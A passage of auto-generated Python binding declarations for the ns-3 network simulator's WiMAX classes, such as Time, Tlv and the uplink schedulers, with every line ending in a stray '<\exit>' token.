cls.add_constructor([param('ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter< ns3::CallbackImplBase > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter< ns3::EventImpl > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter< ns3::NixVector > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter< ns3::OutputStreamWrapper > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter< ns3::Packet > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter< ns3::TraceSourceAccessor > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SsServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SsServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::SubscriberStationNetDevice >', 'device')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'serviceFlow')])<\exit>
cls.add_method('CreateDsaAck',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[])<\exit>
cls.add_method('CreateDsaReq',<\exit>
'ns3::DsaReq',<\exit>
[param('ns3::ServiceFlow const *', 'serviceFlow')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDsaAckTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRspTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxDsaReqRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('InitiateServiceFlows',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ProcessDsaRsp',<\exit>
'void',<\exit>
[param('ns3::DsaRsp const &', 'dsaRsp')])<\exit>
cls.add_method('ScheduleDsaReq',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow const *', 'serviceFlow')])<\exit>
cls.add_method('SetMaxDsaReqRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxDsaReqRetries')])<\exit>
return<\exit>
def register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Time_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_inplace_numeric_operator('+=', param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_binary_comparison_operator('>')<\exit>
cls.add_inplace_numeric_operator('-=', param('ns3::Time const &', 'right'))<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('<=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_binary_comparison_operator('>=')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Time const &', 'o')])<\exit>
cls.add_constructor([param('double', 'v')])<\exit>
cls.add_constructor([param('int', 'v')])<\exit>
cls.add_constructor([param('long int', 'v')])<\exit>
cls.add_constructor([param('long long int', 'v')])<\exit>
cls.add_constructor([param('unsigned int', 'v')])<\exit>
cls.add_constructor([param('long unsigned int', 'v')])<\exit>
cls.add_constructor([param('long long unsigned int', 'v')])<\exit>
cls.add_constructor([param('std::string const &', 's')])<\exit>
cls.add_constructor([param('ns3::int64x64_t const &', 'value')])<\exit>
cls.add_method('Compare',<\exit>
'int',<\exit>
[param('ns3::Time const &', 'o')],<\exit>
is_const=True)<\exit>
cls.add_method('From',<\exit>
'ns3::Time',<\exit>
[param('ns3::int64x64_t const &', 'from'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('From',<\exit>
'ns3::Time',<\exit>
[param('ns3::int64x64_t const &', 'value')],<\exit>
is_static=True)<\exit>
cls.add_method('FromDouble',<\exit>
'ns3::Time',<\exit>
[param('double', 'value'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('FromInteger',<\exit>
'ns3::Time',<\exit>
[param('uint64_t', 'value'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('GetDouble',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFemtoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInteger',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMicroSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMilliSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNanoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPicoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetResolution',<\exit>
'ns3::Time::Unit',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSeconds',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTimeStep',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsNegative',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsPositive',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStrictlyNegative',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStrictlyPositive',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsZero',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetResolution',<\exit>
'void',<\exit>
[param('ns3::Time::Unit', 'resolution')],<\exit>
is_static=True)<\exit>
cls.add_method('To',<\exit>
'ns3::int64x64_t',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
cls.add_method('ToDouble',<\exit>
'double',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
cls.add_method('ToInteger',<\exit>
'int64_t',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Tlv_methods(root_module, cls):<\exit>
cls.add_constructor([param('uint8_t', 'type'), param('uint64_t', 'length'), param('ns3::TlvValue const &', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tlv const &', 'tlv')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Tlv *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyValue',<\exit>
'ns3::TlvValue *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSizeOfLen',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekValue',<\exit>
'ns3::TlvValue *',<\exit>
[])<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TraceSourceAccessor_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TraceSourceAccessor const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Connect',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('ConnectWithoutContext',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Disconnect',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('DisconnectWithoutContext',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3Trailer_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Trailer const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'end')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'frequency'), param('double', 'speed')])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'lambda')])<\exit>
cls.add_method('SetSystemLoss',<\exit>
'void',<\exit>
[param('double', 'systemLoss')])<\exit>
cls.add_method('SetMinDistance',<\exit>
'void',<\exit>
[param('double', 'minDistance')])<\exit>
cls.add_method('GetMinDistance',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLambda',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemLoss',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetHeightAboveZ',<\exit>
'void',<\exit>
[param('double', 'heightAboveZ')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Ucd_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Ucd const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddUlBurstProfile',<\exit>
'void',<\exit>
[param('ns3::OfdmUlBurstProfile', 'ulBurstProfile')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelEncodings',<\exit>
'ns3::OfdmUcdChannelEncodings',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrUlBurstProfiles',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingBackoffEnd',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingBackoffStart',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestBackoffEnd',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestBackoffStart',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUlBurstProfiles',<\exit>
'std::vector< ns3::OfdmUlBurstProfile >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetChannelEncodings',<\exit>
'void',<\exit>
[param('ns3::OfdmUcdChannelEncodings', 'channelEncodings')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'ucdCount')])<\exit>
cls.add_method('SetNrUlBurstProfiles',<\exit>
'void',<\exit>
[param('uint8_t', 'nrUlBurstProfiles')])<\exit>
cls.add_method('SetRangingBackoffEnd',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingBackoffEnd')])<\exit>
cls.add_method('SetRangingBackoffStart',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingBackoffStart')])<\exit>
cls.add_method('SetRequestBackoffEnd',<\exit>
'void',<\exit>
[param('uint8_t', 'requestBackoffEnd')])<\exit>
cls.add_method('SetRequestBackoffStart',<\exit>
'void',<\exit>
[param('uint8_t', 'requestBackoffStart')])<\exit>
return<\exit>
def register_Ns3UlJob_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::UlJob const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDeadline',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetPeriod',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetReleaseTime',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[])<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[])<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSsRecord',<\exit>
'ns3::SSRecord *',<\exit>
[])<\exit>
cls.add_method('GetType',<\exit>
'ns3::ReqType',<\exit>
[])<\exit>
cls.add_method('SetDeadline',<\exit>
'void',<\exit>
[param('ns3::Time', 'deadline')])<\exit>
cls.add_method('SetPeriod',<\exit>
'void',<\exit>
[param('ns3::Time', 'period')])<\exit>
cls.add_method('SetReleaseTime',<\exit>
'void',<\exit>
[param('ns3::Time', 'releaseTime')])<\exit>
cls.add_method('SetSchedulingType',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('SetSize',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('SetSsRecord',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('ns3::ReqType', 'type')])<\exit>
return<\exit>
def register_Ns3UlMap_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UlMap const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddUlMapElement',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe', 'ulMapElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUcdCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUlMapElements',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAllocationStartTime',<\exit>
'void',<\exit>
[param('uint32_t', 'allocationStartTime')])<\exit>
cls.add_method('SetUcdCount',<\exit>
'void',<\exit>
[param('uint8_t', 'ucdCount')])<\exit>
return<\exit>
def register_Ns3UplinkScheduler_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkScheduler const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetBs',<\exit>
'ns3::Ptr< ns3::BaseStationNetDevice >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetDcdTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIsInvIrIntrvlAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIsIrIntrvlAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNrIrOppsAllocated',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTimeStampIrInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUcdTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetBs',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetDcdTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'dcdTimeStamp')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetIsInvIrIntrvlAllocated',<\exit>
'void',<\exit>
[param('bool', 'isInvIrIntrvlAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetIsIrIntrvlAllocated',<\exit>
'void',<\exit>
[param('bool', 'isIrIntrvlAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNrIrOppsAllocated',<\exit>
'void',<\exit>
[param('uint8_t', 'nrIrOppsAllocated')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetTimeStampIrInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'timeStampIrInterval')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetUcdTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'ucdTimeStamp')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3UplinkSchedulerMBQoS_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerMBQoS const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Time', 'time')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('CheckDeadline',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CheckMinimumBandwidth',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CountSymbolsJobs',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
cls.add_method('CountSymbolsQueue',<\exit>
'uint32_t',<\exit>
[param('std::list< ns3::Ptr< ns3::UlJob > >', 'jobs')])<\exit>
cls.add_method('CreateUlJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedType'), param('ns3::ReqType', 'reqType')])<\exit>
cls.add_method('DequeueJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[param('ns3::UlJob::JobPriority', 'priority')])<\exit>
cls.add_method('DetermineDeadline',<\exit>
'ns3::Time',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('EnqueueJob',<\exit>
'void',<\exit>
[param('ns3::UlJob::JobPriority', 'priority'), param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetPendingSize',<\exit>
'uint32_t',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
